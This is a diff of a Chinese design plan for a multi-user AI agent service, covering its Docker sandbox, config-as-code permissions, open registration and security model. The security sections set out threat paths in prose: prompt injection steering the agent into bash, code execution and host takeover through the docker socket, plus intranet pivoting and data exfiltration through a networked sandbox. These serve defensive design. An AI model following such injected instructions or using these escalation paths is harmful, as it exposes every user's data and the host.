@@ -4,9 +4,11 @@
 > 规则（按 CLAUDE.md）：**每个 TODO 项需要单独审批后才能开工**；批准整体计划 ≠ 批准全部 TODO；一次只实现一个 TODO；实现后立即验证并回写状态。
 >
 > 状态标记：`⬜ 待办` `🔵 进行中` `✅ 完成（含验证）` `⚠️ 受阻`
-> 当前进度：**2 / 81 TODO 完成**（r2.4）。里程碑 14 个；T0.1a、T0.1b 已实现并验证；M0 剩余 T0.2–T0.5。（T0.1c 已撤销：实测证明它要守的约束不可执行，见 ADR-007）
+> 当前进度：**2 / 81 TODO 完成**（r3.2）。里程碑 14 个；T0.1a、T0.1b 已完成；M0 剩余 T0.2–T0.5。（T0.1c 已撤销，见 ADR-007）
 >
 > **r2 变更（2026-11-20）**：skills / tools / subagents / MCP / plugins / permissions / hooks 全部改为**随项目版本管理的配置文件**，不入数据库、不提供服务端修改端点、用户不可改（ADR-015）。里程碑由 13 个增至 14 个（新增 M1 配置层），DB 表由 25 张减至 14 张（删除 11 张配置表）。
+>
+> **r3 变更（2026-11-20）**：① **开放注册 + 取消 admin 角色** —— `users.role` 删除、无 `/admin/*`、无 `require_admin`；运维动作改走 shell（`SIGHUP` reload、`python -m app.config dump`、`scripts/*.py`），用户侧只留脱敏的 `GET /capabilities`。② **provider 只要 `base_url`/`api_key`/`model_name` + 通用参数，不接 Azure**。③ **凭据只有一把全局 key** ⇒ 新增 `global_hourly_tokens` 账户级熔断与 `sandbox.max_live_containers` 容量护栏（§8.10）。④ 沙箱网络三档可配，**缺省 `none`**；放宽档必须每用户一张自定义网络（跨用户不可达是 T6.4 的验收断言）；`none` 的三条硬要求：镜像预烘焙工具链、网络失败翻译成人话、必须有一条"全程无网冒烟"（§8.4、T6.3/T6.6/T13.7③）。⑤ `session` 授权存活边界维持 thread 内。⑥ 配置变更工作流维持"建议片段"。详见 §13.1 的 D1–D8 追溯表。
 
 ---
 
@@ -47,23 +49,21 @@
 
 | # | 决策 | 理由 / 代价 |
 |---|---|---|
-| ADR-001 | **OpenAI SDK + Chat Completions API**，不用 Responses API | 循环与工具语义完全自控、可移植（任何 OpenAI-compatible endpoint 通过 `base_url` 接入）。代价：reasoning item、内置 web search 等要自己做（都不在范围内）。SDK 已在 venv（`openai 3.51`）。 |
+| ADR-001 | **OpenAI SDK + Chat Completions API**，不用 Responses API | 循环与工具语义完全自控、可移植。**provider 形态（§13-D1 已决）**：`config/settings.yaml` 只暴露 `base_url` + `api_key`（值经 `${env:OPENAI_API_KEY}` 引用，**全局唯一一把**）+ `model_name` + 通用默认参数（`temperature`/`max_tokens`/`top_p`/超时/重试/`allowed_models`）。**不做 Azure OpenAI 专用分支** —— api-version query、deployment 路由、AAD/Entra token 刷新都不实现；要用 Azure 就前面挂一层 OpenAI-compatible 网关。代价：Azure-only 用户需要自备转换层，我们不承担那部分鉴权复杂度。reasoning item、内置 web search 等同样自己做或不做（不在范围内）。SDK 已在 venv（`openai 3.51`）。 |
 | ADR-002 | **事件溯源为核心**：`event_log` 是唯一真相流 | SSE、持久化、HITL 等待、断线重放、subagent 事件转发、trace inspector、调试全部复用同一模型。代价：需要 retention/compact 策略。 |
-| ADR-003 | **SQLite + 手写迁移**（stdlib `sqlite3`，不引 Alembic） | WAL + `busy_timeout` + 单写者 executor 足够这个规模。探测确认 SQLite 3.45.1（UPSERT / JSON1 可用）。**入库的只有运行时事实**（对话、run、事件、工具调用、中断、用量、审计）。 |
-| ADR-004 | **多用户 + cookie session**（用户选定） | `users`/`sessions` 表、HttpOnly `SameSite=Lax` cookie + double-submit CSRF token、口令用 stdlib `hashlib.scrypt`（零依赖、memory-hard）、role `admin`/`member`、**thread/消息/用量按用户隔离**。代价：配置是全局共享的，用户只能"用"能力不能"配"能力（ADR-015）；per-user 配额只能由运维用 CLI 脚本调整。 |
-| ADR-005 | **Docker 沙箱执行**（用户选定） | 每 workspace 一个**长生命周期**容器（保留 cwd/env/已装包等状态），命令走 `docker exec`；默认 `--network none`、`--cap-drop ALL`、`no-new-privileges`、`--memory/--cpus/--pids-limit`、`--tmpfs /tmp`、idle TTL 回收；用 container **label** 而非 name 做重启对账。经 `asyncio` 子进程调 `docker` CLI（探测：Docker 29.8.1 / cgroup v2 可用），**不引入 docker-py**。 |
+| ADR-003 | **SQLite + 手写迁移**（stdlib `sqlite3`，不引 Alembic） | WAL + `busy_timeout` + 单写者 executor 足够这个规模。要求 SQLite ≥ 3.37（UPSERT + JSON1），部署环境不满足即 fail fast。**入库的只有运行时事实**（对话、run、事件、工具调用、中断、用量、审计）。 |
+| ADR-004 | **多用户 + cookie session + 开放注册，且没有 admin 角色**（用户选定，r3 修订） | `users`/`sessions` 表、HttpOnly `SameSite=Lax` cookie + double-submit CSRF token、口令用 stdlib `hashlib.scrypt`（零依赖、memory-hard）。**`users.role` 取消**：能力全在文件里（ADR-015），应用内不存在"能改配置的角色"，所以 admin 是个空概念 —— 有 shell 的运维才是配置的唯一变更者，那是部署身份不是应用角色。`users.status`(active/disabled) 保留，只由运维 CLI 改（滥用注册时需要能关掉账号）。所有用户**共享同一份能力快照**，隔离的是 thread/消息/用量/workspace。<br>**连带后果（必须正视）**：开放注册 + 沙箱 bash + 只有一把 provider key ⇒ 任何互联网访客注册后就能消耗同一账户的钱与宿主的内存。护栏见 §8.10/§8.11（per-user 预算 + 全局容器上限 + 注册限速），默认值按部署环境的可用内存核定。 |
+| ADR-005 | **Docker 沙箱执行**（用户选定） | 每 workspace 一个**长生命周期**容器（保留 cwd/env/已装包等状态），命令走 `docker exec`；`--cap-drop ALL`、`no-new-privileges`、`--memory/--cpus/--pids-limit`、`--tmpfs /tmp`、idle TTL 回收；用 container **label** 而非 name 做重启对账。经 `asyncio` 子进程调 `docker` CLI，**不引入 docker-py**。要求 Docker Engine（支持 user-defined bridge 与 `--internal`）+ cgroup v2，启动探测不满足即 fail fast。<br>**网络（§13-D5 + D8 已决：默认最严）**：`settings.sandbox.network_mode` 三档 —— **`none`（默认，r3 改判：连内部 DNS 都不要，跨用户/网关/metadata 全部物理不可达）** / `internal`（自定义网络加 `--internal`，只能同网内）/ `per_user_bridge`（每用户一张自定义 bridge，可出网；部署者显式改配置 + `kill -HUP` 才生效）。两条验收要求：(1) 绝不用默认 `bridge` 网络 —— 同网段容器互通，会打破跨用户隔离；(2) 网络模式变更 = 配置变更（走文件 + reload），不做运行时协商。<br>**镜像源必须可配置**：不少部署环境需要 mirror 才能拉镜像/装包（dockerd `registry-mirrors`、`PIP_INDEX_URL`、apt mirror、uv `[[index]]`），因此 mirror 走 `settings.sandbox.*` 注入（T6.3），且构建失败的报错必须指名失败的源，而不是只抛 docker 退出码。<br>**缺省 `none` 的设计后果（不是小事，T6.3/T6.6 要落实）**：容器**运行时**完全无网 ⇒ agent 不能 `pip install`/`npm install`/`git clone` 任何东西 ⇒ 沙箱镜像必须**预烘焙**工具链（coreutils/git/rg/jq + 一组常用 Python 包），"加一个依赖"变成"改 Dockerfile + `make sandbox-build`"这一配置级动作。注意 **build 期与运行期是两件事**：`docker build` 走 dockerd 自己的网络，`--network none` 只约束运行期 —— 别把两者混在一条配置里。同时 `none` 下"网络不可达"是**预期行为而非故障**，bash 工具与错误信息必须能把它解释清楚（见 T6.6），否则用户只会看到一堆诡异的 socket 超时。<br>**放宽到出网档的已知代价（写成部署前提，应用层不假装解决）**：沙箱会落在部署环境的同一网段 ⇒ 可达路由器管理页、NAS、内网 HTTP 服务等；配合 prompt injection 即成内网 pivot 与数据外泄通道。云主机还需 route/防火墙挡 `169.254.169.254`。缺省 `none` 就是为了把这条整体移出默认状态；要放宽就是改配置 + `kill -HUP`，即"每一次开网络都是一次有记录的配置变更"。 |
 | ADR-006 | **文件工具在 host 侧操作 bind mount 目录** | 与容器 `/work` 是同一份字节，host 侧 realpath 约束即可，比每次 `docker exec cat` 快且好测；bash/脚本类留在容器内。 |
-| ADR-007 | **MCP 用官方 `mcp` SDK**（用户选定）+ 自写 adapter | 协议生命周期（initialize/tools·list/tools·call/elicitation/sampling）由成熟实现负责；我们只做 `MCPBridge → ToolRegistry` 的命名与权限映射 `mcp__<server>__<tool>`。**server 清单来自 `config/mcp.yaml`，工具目录只在内存里**（启动时 connect + `tools/list`，不入库）。**依赖足迹（T0.1b 实测 + r2.4 复核，勿凭想象）**：`mcp 2.3.0` 拉入 `pyjwt[crypto]`→`cryptography 50.0.2`(15MB) + `cffi`、`sse-starlette`、`python-multipart`、`jsonschema`、`mcp-types` 等，包数 37→61、venv 181MB。
-> **一条被实测否证的约束**：原写"只用 client 侧、禁止 import `mcp.server.*`"。**做不到** —— SDK 自己的 `mcp/client/client.py` → `client/_memory.py:13` → `from mcp.server import Server`，因此 `mcp.client.stdio` / `.session` / `.streamable_http` 任一入口都会载入 **59 个 `mcp.server.*` 模块 + cryptography，启动 RSS +35.9MB**（`jwt` 未加载：OAuth/JWT 路径是懒的）。
-> 所以正确的表述是：**我们不用 server 侧的"功能"，但无法用 import 图来证明它**。落为两条可执行/可评审的口径：(1) 不实现、不挂载我们自己的 MCP **server**（`mcp.server.*` 只在 SDK 内部出现；真要写 server 时另行评审，因为那时 `request_state` 的 AESGCM key 才成为我们要管理的素材）；(2) `cryptography` 保持"传递依赖"身份 —— 不进 `pyproject` 的直接依赖列表，`app/**` 不 import 它（这条是靠代码评审与 T0.4 的 hygiene 用例顺带保证，不单独设 TODO）。 |
+| ADR-007 | **MCP 用官方 `mcp` SDK**（用户选定）+ 自写 adapter | 协议生命周期（initialize / tools·list / tools·call / elicitation / sampling）由成熟实现负责；我们只做 `MCPBridge → ToolRegistry` 的命名与权限映射 `mcp__<server>__<tool>`。**server 清单来自 `config/mcp.yaml`，工具目录只在内存里**（启动时 connect + `tools/list`，不入库）。**依赖与导入面的既定事实**：`mcp` 拉入 `pyjwt[crypto]`→`cryptography`、`cffi`、`sse-starlette`、`python-multipart`、`jsonschema`、`mcp-types` 等（本仓库因此从 37 包增至 61 包）；且 SDK 的 client 包在模块级就 import 了 server 包（`mcp/client/client.py` → `client/_memory.py` → `from mcp.server import Server`），因此任何 client 用法都会把整个 `mcp.server` 代码树载入本进程。**结论**：不使用 server 侧的*功能*，但不要用 import 图去"证明"这一点（该约束不可执行，故不设守卫用例）；口径落在两条可评审的约定上 —— (1) 不实现、不挂载我们自己的 MCP server（真要写时另行评审：那时 `mcp.server.request_state` 的 AESGCM key 才成为我们要管理的密钥），(2) `cryptography` 只作传递依赖，不进 `pyproject` 的直接依赖列表、不被 `app/**` import。 |
 | ADR-008 | **Skills / Subagents = Markdown + YAML frontmatter，放在 `config/` 下** | 与 Claude Code 习惯一致，纯文本可版本管理；skill 正文按需注入（progressive disclosure），系统提示只带 name/description/when_to_use。 |
 | ADR-009 | **Permissions = 规则引擎（读自 `config/permissions.yaml`）** | pattern grammar `ToolName` / `ToolName(<principal>)`，效果优先级 **deny > ask > allow**（不看特异性），叠加 mode preset 与 tool 的 `read_only`/`destructive` 默认值。授权范围只保留 **`once` / `session`** 两档：`always` 意味着写配置，与 ADR-015 冲突，改为"复制一段建议规则 YAML 供提交评审"。 |
 | ADR-010 | **Hooks = 外部命令 + 进程内 callable** | 命令型（stdin JSON、stdout JSON、`exit 2` 即 block）安全面小、可跨语言；callable 型只允许来自 **trusted 插件**（in-process 即 service 权限）。声明来源 `config/hooks.yaml` + 插件 manifest。超时策略可配 `on_timeout: block\|allow`。 |
-| ADR-011 | **Plugins = 仓库内资源包 + enable/trust 分离** | manifest 声明 skills/agents/mcp/tools/hooks；`enabled` 控制装配、`trusted` 才允许进程内 Python entry point。两者都写在 `config/plugins.yaml`，只有运维/评审能改。reload = 配置快照原子替换，不中断在跑的 run。 |
+| ADR-011 | **Plugins = 仓库内资源包 + enable/trust 分离** | manifest 声明 skills/agents/mcp/tools/hooks；`enabled` 控制装配、`trusted` 才允许进程内 Python entry point。两者都写在 `config/plugins.yaml`，**只有改文件（运维/代码评审）能变更** —— r3 起系统里没有 admin 角色，因此 `trusted` 不是"管理员在 UI 里点的勾"，而是一个需要评审的提交内容。reload = 配置快照原子替换，不中断在跑的 run；触发方式是 **SIGHUP 或重启**（不再有 HTTP reload 端点，理由见 §7）。 |
 | ADR-012 | **HITL = 统一 `interrupt` 表 + run 状态机** | 权限审批 / `ask_user` / plan 审批 / MCP elicitation 共用一套持久化 + `asyncio.Future` + timeout + 重启后可 resolve 的机制。**中断的事实入库（`interrupt` + `event_log`），中断的效果不入库**（`session` 授权只在进程内 TTL 表）。 |
 | ADR-013 | **前端 Next.js（App Router）+ TS + Tailwind，自写 SSE reader**（用户选定 v1 范围：聊天 + 审批） | 需要 POST header（CSRF/session）所以不用原生 `EventSource`，用 `fetch` + `ReadableStream` 自解 SSE 帧；事件类型由后端 pydantic JSON Schema 生成 TS，避免手写漂移。 |
 | ADR-014 | **单节点部署** | run 状态在进程内，重启靠 `event_log` + `interrupt` 恢复；跨节点需要外部队列，不在 v1。reload 语义也因此天然是"本进程"。 |
-| **ADR-015** | **config-as-code：装配面 = 仓库文件，DB 只存运行时事实，服务端不接受配置写入**（用户选定） | 一句话原则：**"agent 能做什么"进 git，"agent 做了什么"进 SQLite。** 收益：能力变更天然可评审、可回滚、可 diff；启动即可确定完整能力面（skills/tools/MCP/plugins/hooks/permission rules 全在 `ConfigSnapshot` 里），`config-check` 能在 CI 抓到"skill 引用了被关掉的工具"这类错；DB schema 大幅瘦身（25→14 表），去掉自研 at-rest 加密与主密钥管理（注意：`cryptography` 仍经 `mcp→pyjwt[crypto]` 作为**传递依赖**存在，但不再是我们的直接依赖，也不被 `app/**` 使用 —— 见 ADR-007 的实测注）；不存在"配置被运行时篡改导致提权"的攻击面（除了文件本身）。代价：改配置要 reload/重启；无法 per-user 定制；provider 花费无法按用户区分（见 §13-Q2）。**新增的信任边界：`config/` 目录的文件权限**（§8.7）。 |
+| **ADR-015** | **config-as-code：装配面 = 仓库文件，DB 只存运行时事实，服务端不接受配置写入**（用户选定） | 一句话原则：**"agent 能做什么"进 git，"agent 做了什么"进 SQLite。** 收益：能力变更天然可评审、可回滚、可 diff；启动即可确定完整能力面（skills/tools/MCP/plugins/hooks/permission rules 全在 `ConfigSnapshot` 里），`config-check` 能在 CI 抓到"skill 引用了被关掉的工具"这类错；DB schema 大幅瘦身（25→14 表），去掉自研 at-rest 加密与主密钥管理（注意：`cryptography` 仍经 `mcp→pyjwt[crypto]` 作为**传递依赖**存在，但不再是我们的直接依赖，也不被 `app/**` 使用 —— 见 ADR-007）；不存在"配置被运行时篡改导致提权"的攻击面（除了文件本身）。代价（三条均已确认接受）：改配置要 reload/重启（SIGHUP，见 §7）；无法 per-user 定制；**provider 花费无法按用户区分 —— 只有一把全局 key（§13-D2），所以账户级隔离靠 per-user token 预算兜底（§8.10），不是靠凭据**。**新增的信任边界：`config/` 目录的文件权限**（§8.7）。 |
 
 ---
 
@@ -79,7 +79,7 @@
 │   skills/<slug>/SKILL.md          │   │   ├ MCPPlan(+已连工具) ├ PermissionsPolicy│
 │   agents/<name>.md                │   │   └ 原子替换；run 持有旧引用 → 不撕裂      │
 │   plugins/<name>/.vanilla-plugin/ │   └──────────────────────────────────────────┘
-└───────────────────────────────────┘                     ▲ POST /admin/config/reload (admin)
+└───────────────────────────────────┘                     ▲ kill -HUP <pid>（运维触发，无 HTTP 端点）
 
                          ┌────────────────────────── web/ (Next.js) ─────────────────────────┐
                          │  /login  /chat(thread)  [ToolCard] [ApprovalDialog] [TracePanel]  │
@@ -87,7 +87,7 @@
                     REST/JSON    │        SSE (event stream, Last-Event-ID)   │ resolve(once/session)
 ┌────────────────────────────────┴───────────────────────────────────────────▼────────────────────────┐
 │ service/ (FastAPI, 单进程 asyncio)                                                                     │
-│  api/  auth │ threads │ runs │ messages │ stream │ interrupts │ usage │ config(read-only) │ admin    │
+│  api/  auth(register,login) │ threads │ runs │ messages │ stream │ interrupts │ usage │ capabilities │
 │    └───────────────────────────────────────┬─────────────────────────────────────────────────────────│
 │  agent runtime (RunManager → RunTask)      │                                                         │
 │    loop: ContextBuilder(snapshot) → ModelClient → 解析流 → tool_calls?                                 │
@@ -106,8 +106,8 @@
 │  workspace/ (per-user 目录 + 路径约束)      sandbox/ (docker exec | local | fake)                     │
 └──────────┬────────────────────────────────────────────────────────────────────────────┬─────────────┘
            │ SQLite (WAL)：只存运行时事实                                                  │ docker CLI
-   ./data/vanilla.db, ./data/artifacts/                              container per workspace
-                                                       -v ./data/workspaces/<user>:/work  --network none
+   ./data/vanilla.db, ./data/artifacts/             container per workspace（默认无网络）
+                          -v ./data/workspaces/<user>:/work  --network none（放宽才建 va-net-<user>）
 ```
 
 主循环不变量（每个都要有对应测试，见 §10）：
@@ -156,7 +156,8 @@ class ConfigStore:  # 持有当前 snapshot；swap() 先构建+校验新快照�
 
 # —— 配置文件到资源的贡献关系（合并优先级）——
 # settings.yaml 默认  <  plugins/<name>/* 贡献  <  *.local.yaml 覆盖（仅 CONFIG_ALLOW_LOCAL=1）
-# permission rules：所有来源并集，deny 永远赢；插件不得声明 bypass，也不得覆写 admin policy。
+# permission rules：所有来源并集，deny 永远赢；插件不得声明 bypass，也不得覆写
+#   permissions.yaml 里的 policy 段（那是运维声明的硬约束，不存在"运行时管理员"能改它）。
 # 同名冲突（skill slug / tool name / mcp server name / hook matcher）→ error，不允许静默覆盖。
 
 # app/agent/events.py —— 事件信封（所有对外流式都用它）
@@ -199,7 +200,7 @@ class EventType(StrEnum):
     USAGE = "usage"
     ERROR = "error"
     HEARTBEAT = "heartbeat"
-# 注 1：不再有 CONFIG_CHANGED 之类事件；reload 走 /admin/config/reload 的同步返回值。
+# 注 1：不再有 CONFIG_CHANGED 之类事件；reload 由运维经 SIGHUP 触发（无 HTTP 端点，见 §7）。
 # 注 2：必须写成 `MEMBER = "value"` 形式 —— T5.3 的 JSON Schema 生成依赖 StrEnum 的 value，
 #       裸成员列表（`A, B, C`）在 StrEnum 下不是合法枚举定义，会生成空 union 并让"漂移即失败"崩在这里。
 
@@ -278,9 +279,15 @@ class SessionGrantStore:      # key = (user_id, thread_id, rule_pattern_key) →
 
 ```
 config/                              # 随项目提交，服务只读
-  settings.yaml                      # provider/model/温度/max_turns/wall-clock 上限/预算/
-                                     #   sandbox 限额(default 2g/1cpu/256pids)/network_mode/
-                                     #   permission default_mode/allowed_models/allowed_modes/能力位
+  settings.yaml                      # provider: base_url / api_key(${env:OPENAI_API_KEY}) / model_name
+                                     #   + temperature/max_tokens/top_p/timeout/retries/allowed_models
+                                     # limits: max_turns / wall_clock / per_user_daily_tokens /
+                                     #   global_hourly_tokens（全局 key 的唯一硬闸门，§8.10）
+                                     # sandbox: memory/cpus/pids_limit, network_mode(**none 默认**|
+                                     #   internal|per_user_bridge), max_live_containers, idle_ttl_s,
+                                     #   pip_index_url/apt_mirror（仅 build 期与开了网络时才用）
+                                     # registration: open(bool) / per_ip_rate / per_ip_daily
+                                     # permissions: default_mode / allowed_modes
   tools.yaml                         # 内置工具 enabled、timeout_s、max_result_bytes、参数上限、
                                      #   http_fetch 域名 allowlist、bash 硬超时
   permissions.yaml                   # default_mode + policy(disallow_bypass) + mode preset 覆写 +
@@ -297,8 +304,8 @@ config/                              # 随项目提交，服务只读
   plugins/<name>/.vanilla-plugin/plugin.json   # {name,version,min_service_version,skills[],agents[],
                                      #            mcpServers[],hooks[],tools[],pythonEntryPoints[]}
   plugins/<name>/{skills,agents,hooks,mcp}/...  # 插件贡献的资源
-  *.local.yaml                       # 可选本机覆盖（可能含明文 secret），仅当 CONFIG_ALLOW_LOCAL=1 生效
-                                     # ⚠️ 当前 .gitignore 尚无对应条目 → 必须由 T0.1 补上，见 §8.6
+  *.local.yaml                       # 可选的本地部署覆盖（可能含明文 secret），不入库；
+                                     #   仅当 CONFIG_ALLOW_LOCAL=1 生效（.gitignore 已覆盖，T0.1a）
 ```
 
 - **`${env:VAR}` 展开**：`mcp.yaml`/`hooks.yaml`/`plugins.yaml` 里的 secret、path 一律用环境变量引用；配置文件**不得含明文密钥**，`make config-check` 有一条扫描规则（正则命中 `sk-` / PEM header / 长 base64 → error）。
@@ -316,7 +323,7 @@ config/                              # 随项目提交，服务只读
 
 | 表 | 关键列 | 说明 |
 |---|---|---|
-| `users` | id, email UQ, pw_hash, pw_alg, role(admin/member), status, max_concurrent_runs, daily_token_budget, created_at, last_login_at | 多用户根。配额列只能由 `scripts/set_user_quota.py` CLI 改（无 HTTP 端点） |
+| `users` | id, email UQ, pw_hash, pw_alg, **status(active/disabled)**, max_concurrent_runs, daily_token_budget, created_at, last_login_at, register_ip | 多用户根。**无 `role` 列**（ADR-004：没有 admin 角色）。配额列在注册时从 `settings.yaml` 默认值落库，之后只能由 `scripts/set_user_quota.py` / `scripts/disable_user.py` CLI 改（无 HTTP 端点） |
 | `sessions` | id, user_id FK, token_hash UQ, expires_at, last_seen_at, user_agent, ip | cookie 存原始 token，DB 只存 sha256 |
 | `workspace` | id, user_id FK UQ, root_path, container_ref, container_state, idle_deadline, created_at | 沙箱运行态；限额/网络模式来自 `settings.yaml` |
 | `thread` | id, user_id, workspace_id, title, model, temperature, permission_mode, status, created_at, updated_at, archived_at, last_run_id | `model`/`permission_mode` 是会话运行参数，写入前必须校验 ∈ snapshot.allowed_* |
@@ -335,11 +342,16 @@ config/                              # 随项目提交，服务只读
 
 ## 7. HTTP API 与 SSE 协议
 
-前缀 `/api/v1`。**鉴权豁免是显式白名单，不是路径前缀** —— 免 session 的端点只有：`POST /auth/login`、`POST /auth/signup`（仅在库内无 user 时开放，见 T3.3）、`GET /healthz`。其余全部要求 session cookie，**包括 `/auth/me`、`POST /auth/logout`、`POST /auth/password`**（改密码必须有已认证 principal，绝不接受 body 里的 email 作为身份来源）。`/admin/*` 另需 `require_admin`。**注意整张表里没有任何配置写入端点** —— 唯一的 POST 写类操作是 `/admin/config/reload`（只重读文件、重新装配，不改文件）。
+前缀 `/api/v1`。**鉴权豁免是显式白名单，不是路径前缀** —— 免 session 的端点只有：`POST /auth/login`、`POST /auth/register`（**开放注册**，受 per-IP 限速；可用 `settings.registration.open=false` 关闭）、`GET /healthz`。其余全部要求 session cookie，**包括 `/auth/me`、`POST /auth/logout`、`POST /auth/password`**（改密码必须有已认证 principal，绝不接受 body 里的 email 作为身份来源）。
+
+**没有 `/admin/*`，没有 `require_admin`**（§13-D3：无 admin 角色）。运维动作全部走 shell：`python -m app.config dump`（完整诊断视图）、`kill -HUP <pid>`（reload）、`scripts/{list_users,set_user_quota,disable_user}.py`。两个刻意的取舍：
+
+- **配置 reload 不是 HTTP 端点**。开放注册 ⇒ 任何互联网访客都能注册；若 reload 可被任意登录用户触发，就等于把"全局能力快照替换"变成 DoS/churn 面（且能探测出配置文件的抖动时机）。SIGHUP 只对有进程所有权的人有效，天然对齐 ADR-015 的"变更者是运维"。
+- **完整能力面不再通过 HTTP 暴露**。`GET /config/report`（来源 sha256、hook matcher、MCP command/args/env 名、plugin 路径）挪到 CLI；用户侧只留 `GET /capabilities` —— 我能调用什么（名称 + 描述），而不是"这套系统怎么搭起来的"。给开放注册用户一张攻击目标地图没有好处。
 
 | 方法 | 路径 | 说明 |
 |---|---|---|
-| POST | `/auth/signup` `/auth/login` `/auth/logout` `/auth/password` | 首次启动无 user 时允许 admin bootstrap（一次性） |
+| POST | `/auth/register` `/auth/login` `/auth/logout` `/auth/password` | register 开放（无邀请码、无首账号特权），per-IP 限速 + 每日配额；`status` 仅运维 CLI 可改 |
 | GET | `/auth/me` | 当前用户 + 能力位 |
 | POST | `/threads` | 建 thread（`model`/`permission_mode` 需在 snapshot 允许集合内） |
 | GET | `/threads` `/threads/{id}` `/threads/{id}/messages` | 列表（游标分页）/详情/历史 |
@@ -351,13 +363,10 @@ config/                              # 随项目提交，服务只读
 | POST | `/threads/{id}/compact` | 强制压缩上下文 |
 | GET | `/interrupts?status=pending` | 待办审批（前端角标） |
 | POST | `/interrupts/{iid}/resolve` | `{response, scope?: once\|session}` |
-| GET | `/tools` `/skills` `/agents` | **只读**：来自当前 snapshot（含 disabled 项与原因） |
-| GET | `/mcp/status` | **只读**：每个 server 的连接状态、工具数、last_error |
-| GET | `/plugins` | **只读**：manifest、enabled/trusted、加载失败原因 |
-| GET | `/config/report` (admin) | snapshot version + sources sha256 + 合并后视图 + issues 列表 |
-| POST | `/admin/config/reload` (admin) | 重读 `config/` → 校验 → 原子替换；返回新 version 或错误报告 |
-| GET | `/usage/summary` | 当前用户用量；admin 可 `?user_id=` |
-| GET | `/admin/users` (admin) | 只读列表（配额修改走 CLI 脚本） |
+| GET | `/capabilities` | **只读、用户视角**：可调用的 tools/skills/agents（名称+描述+是否需审批）；**不含**配置来源 hash、MCP command/args/env 名、hook matcher、plugin 路径 |
+| GET | `/mcp/status` | **只读、已脱敏**：server 名称、连接状态、工具数、last_error（命令行与环境变量名不外泄） |
+| GET | `/usage/summary` | 当前用户用量与预算余量（**无 `?user_id=` 变体**，因为没有能看别人数据的角色） |
+| — | *（非 HTTP）* `python -m app.config dump\|report`、`kill -HUP <pid>`、`scripts/list_users.py` | 运维面：完整 snapshot、reload、用户与配额管理。由 shell 权限而非应用角色控制 |
 | GET | `/workspaces/current` `POST /workspaces/current/reset` `GET /workspaces/current/file?path=` | 沙箱状态 + host 侧读文件（供前端渲染 diff）；reset 只清容器与临时状态，不动配置 |
 
 SSE 细节：
@@ -373,13 +382,13 @@ SSE 细节：
 ## 8. 安全模型
 
 1. **认证**：`hashlib.scrypt(n, r=16, p=1, dklen=32)`，参数入库以便升级；session token `secrets.token_urlsafe(32)`，DB 存 sha256，cookie `HttpOnly; SameSite=Lax; Path=/; Secure(prod)`，滑动过期 30 天；登录限速（每 IP + 每 email）。
-2. **授权**：所有 repo 查询强制带 `user_id` 谓词（`scoped_read/scoped_write` 包装，用"必须传 principal"的 API 形状防呆）；admin 端点单独依赖 `require_admin`。用户之间隔离的是对话/用量/workspace，**不是能力**。
-3. **CSRF**：非 GET 请求要求 `X-CSRF-Token` 与 cookie 中的 double-submit 值一致。**豁免 `POST /auth/login` 与 `POST /auth/signup`**，否则死锁：全新浏览器无任何 cookie 时，double-submit 校验要求的 token 还没被签发过，而签发它的唯一时机（登录后）在要求它之后 → 登录页永远 403。login CSRF 危害有限（攻击者只能把受害者登进攻击者自己的账号），且 `SameSite=Lax` 已阻断跨站 POST 携带 cookie，故接受。**token 签发点**：`GET /auth/me`（前端首屏必调）与 login/signup 的成功响应都会下发 `csrf_token` cookie；中间件顺序 = session 解析 → CSRF → 路由。
-4. **沙箱威胁模型**：`--network none` 默认、`--cap-drop ALL`、`no-new-privileges`、`--memory 2g --cpus 1 --pids-limit 256`、`--tmpfs /tmp:size=512m`、非 root `--user`、workspace 只 bind mount 该用户目录（防跨用户读）。已知残余风险：共享内核（runc），不抗针对性内核提权 —— 明确写进文档，不做过度承诺。
-   - **部署形态与 docker socket（重要，勿踩）**：容器化 service 后它仍需驱动沙箱容器，唯一途径是挂 `/var/run/docker.sock`，而 **socket == 宿主机 root**：一旦 service 进程被攻陷（§8.5 的 prompt-injection → bash → 代码执行链条是现实路径），攻击者可起一个挂载宿主根目录的特权容器，读走**所有**用户的 workspace 与 `vanilla.db`，上面的"防跨用户读"随之失效。因此 v1 **定为 service 以宿主机进程运行**（venv + systemd unit，或 `uv run` 直跑；用户 2026-11-20 批准，§13-Q9 关闭），`docker-compose.yml` 只装 web（+ 可选示例 MCP server），service 通过 `docker` CLI 操作宿主 daemon，不进入容器。若必须容器化，则用受限 socket 代理（只放行 create/start/exec/kill + 指定 label 过滤）或独立 rootless daemon，并把"service 容器 ≠ 宿主特权"写进部署验收项。见 §13-Q9。
+2. **授权**：所有 repo 查询强制带 `user_id` 谓词（`scoped_read/scoped_write` 包装，用"必须传 principal"的 API 形状防呆）。**r3 起没有 `require_admin`，也没有第二等公民端点**：唯一的权限分层是"HTTP 面（任何注册用户，只能看自己的数据与自己的能力视图）"vs"shell 面（运维：改文件、SIGHUP、CLI 脚本）"。用户之间隔离的是对话/用量/workspace，**不是能力**（能力全用户共享，ADR-015）。这条设计的可检验形式：任何返回数据的端点都不得出现别人的 id 作为查询参数 —— 除 `/capabilities` 外全部只按 principal 取数。
+3. **CSRF**：非 GET 请求要求 `X-CSRF-Token` 与 cookie 中的 double-submit 值一致。**豁免 `POST /auth/login` 与 `POST /auth/register`**，否则死锁：全新浏览器无任何 cookie 时，double-submit 校验要求的 token 还没被签发过，而签发它的唯一时机（登录后）在要求它之后 → 登录页永远 403。login CSRF 危害有限（攻击者只能把受害者登进攻击者自己的账号），且 `SameSite=Lax` 已阻断跨站 POST 携带 cookie，故接受。**token 签发点**：`GET /auth/me`（前端首屏必调）与 login/register 的成功响应都会下发 `csrf_token` cookie；中间件顺序 = session 解析 → CSRF → 路由。
